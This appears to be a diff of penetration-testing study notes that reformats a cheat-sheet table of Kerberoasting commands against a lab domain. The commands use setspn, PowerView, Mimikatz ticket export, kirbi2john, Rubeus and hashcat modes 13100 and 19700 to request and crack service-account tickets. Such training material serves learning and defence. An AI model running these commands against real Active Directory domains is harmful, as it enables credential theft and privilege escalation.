@@ -48,34 +48,34 @@
 
 # 🧾 1. Command Cheat Sheet
 
-|Command|What it does|
-|---|---|
-|`setspn.exe -Q */*`|Queries the domain for accounts/objects with registered SPNs.|
-|`setspn.exe -T INLANEFREIGHT.LOCAL -Q */*`|Searches for SPNs specifically within the target domain.|
-|`Add-Type -AssemblyName System.IdentityModel`|Loads the .NET `System.IdentityModel` assembly into the PowerShell session.|
-|`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"`|Creates a Kerberos requestor token and causes a TGS request for the supplied SPN.|
-|`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`|Enumerates SPNs and requests Kerberos tickets for the discovered SPNs.|
-|`kerberos::list /export`|Mimikatz command that lists Kerberos tickets and exports them as `.kirbi` files.|
-|`base64 /out:true`|Configures Mimikatz to output extracted ticket data as Base64.|
-|`echo "<base64 blob>" \| tr -d \\n`|Removes newline characters from a Base64 ticket blob so it becomes one continuous line.|
-|`cat encoded_file \| base64 -d > sqldev.kirbi`|Decodes a Base64 ticket and writes it to a `.kirbi` file.|
-|`python2.7 kirbi2john.py sqldev.kirbi`|Extracts crackable Kerberos ticket material from a `.kirbi` file.|
-|`sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`|Reformats the extracted ticket material into the Hashcat RC4 TGS format.|
-|`cat sqldev_tgs_hashcat`|Displays the prepared Hashcat-compatible Kerberos hash.|
-|`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`|Cracks Kerberos 5 etype 23 TGS-REP hashes using Hashcat mode `13100`.|
-|`Import-Module .\PowerView.ps1`|Loads PowerView into the current PowerShell session.|
-|`Get-DomainUser * -spn \| select samaccountname`|Enumerates domain users that have an SPN.|
-|`Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`|Requests the TGS for `sqldev` and directly formats it for Hashcat.|
-|`Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`|Requests TGS tickets for SPN accounts and exports the results to CSV.|
-|`cat .\ilfreight_tgs.csv`|Displays the exported ticket information.|
-|`.\Rubeus.exe`|Displays Rubeus functionality/help.|
-|`.\Rubeus.exe kerberoast /stats`|Enumerates Kerberoastable accounts and displays statistics without requesting tickets.|
-|`.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`|Kerberoasts accounts matching `admincount=1` and prevents output from being wrapped across lines.|
-|`.\Rubeus.exe kerberoast /user:testspn /nowrap`|Kerberoasts a specific user and outputs the hash without wrapping.|
-|`.\Rubeus.exe kerberoast /tgtdeleg /nowrap`|Requests service tickets using the `tgtdeleg` technique and attempts to obtain RC4 tickets where supported.|
-|`Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`|Checks a user's SPN and supported Kerberos encryption-type configuration.|
-|`hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt`|Cracks Kerberos 5 etype 18 TGS-REP hashes using Hashcat mode `19700`.|
-|`s`|Hashcat interactive status command while a cracking job is running.|
+| Command                                                                                                                                                                                                      | What it does                                                                                                |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
+| `setspn.exe -Q */*`                                                                                                                                                                                          | Queries the domain for accounts/objects with registered SPNs.                                               |
+| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */*`                                                                                                                                                                   | Searches for SPNs specifically within the target domain.                                                    |
+| `Add-Type -AssemblyName System.IdentityModel`                                                                                                                                                                | Loads the .NET `System.IdentityModel` assembly into the PowerShell session.                                 |
+| `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"`                                                                                                                  | Creates a Kerberos requestor token and causes a TGS request for the supplied SPN.                           |
+| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Enumerates SPNs and requests Kerberos tickets for the discovered SPNs.                                      |
+| `kerberos::list /export`                                                                                                                                                                                     | Mimikatz command that lists Kerberos tickets and exports them as `.kirbi` files.                            |
+| `base64 /out:true`                                                                                                                                                                                           | Configures Mimikatz to output extracted ticket data as Base64.                                              |
+| `echo "<base64 blob>" \| tr -d \\n`                                                                                                                                                                          | Removes newline characters from a Base64 ticket blob so it becomes one continuous line.                     |
+| `cat encoded_file \| base64 -d > sqldev.kirbi`                                                                                                                                                               | Decodes a Base64 ticket and writes it to a `.kirbi` file.                                                   |
+| `python2.7 kirbi2john.py sqldev.kirbi`                                                                                                                                                                       | Extracts crackable Kerberos ticket material from a `.kirbi` file.                                           |
+| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`                                                                                                                | Reformats the extracted ticket material into the Hashcat RC4 TGS format.                                    |
+| `cat sqldev_tgs_hashcat`                                                                                                                                                                                     | Displays the prepared Hashcat-compatible Kerberos hash.                                                     |
+| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`                                                                                                                                       | Cracks Kerberos 5 etype 23 TGS-REP hashes using Hashcat mode `13100`.                                       |
+| `Import-Module .\PowerView.ps1`                                                                                                                                                                              | Loads PowerView into the current PowerShell session.                                                        |
+| `Get-DomainUser * -spn \| select samaccountname`                                                                                                                                                             | Enumerates domain users that have an SPN.                                                                   |
+| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`                                                                                                                                     | Requests the TGS for `sqldev` and directly formats it for Hashcat.                                          |
+| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`                                                                                          | Requests TGS tickets for SPN accounts and exports the results to CSV.                                       |
+| `cat .\ilfreight_tgs.csv`                                                                                                                                                                                    | Displays the exported ticket information.                                                                   |
+| `.\Rubeus.exe`                                                                                                                                                                                               | Displays Rubeus functionality/help.                                                                         |
+| `.\Rubeus.exe kerberoast /stats`                                                                                                                                                                             | Enumerates Kerberoastable accounts and displays statistics without requesting tickets.                      |
+| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`                                                                                                                                                 | Kerberoasts accounts matching `admincount=1` and prevents output from being wrapped across lines.           |
+| `.\Rubeus.exe kerberoast /user:testspn /nowrap`                                                                                                                                                              | Kerberoasts a specific user and outputs the hash without wrapping.                                          |
+| `.\Rubeus.exe kerberoast /tgtdeleg /nowrap`                                                                                                                                                                  | Requests service tickets using the `tgtdeleg` technique and attempts to obtain RC4 tickets where supported. |
+| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`                                                                                                       | Checks a user's SPN and supported Kerberos encryption-type configuration.                                   |
+| `hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt`                                                                                                                                             | Cracks Kerberos 5 etype 18 TGS-REP hashes using Hashcat mode `19700`.                                       |
+| `s`                                                                                                                                                                                                          | Hashcat interactive status command while a cracking job is running.                                         |
 
 ---
 
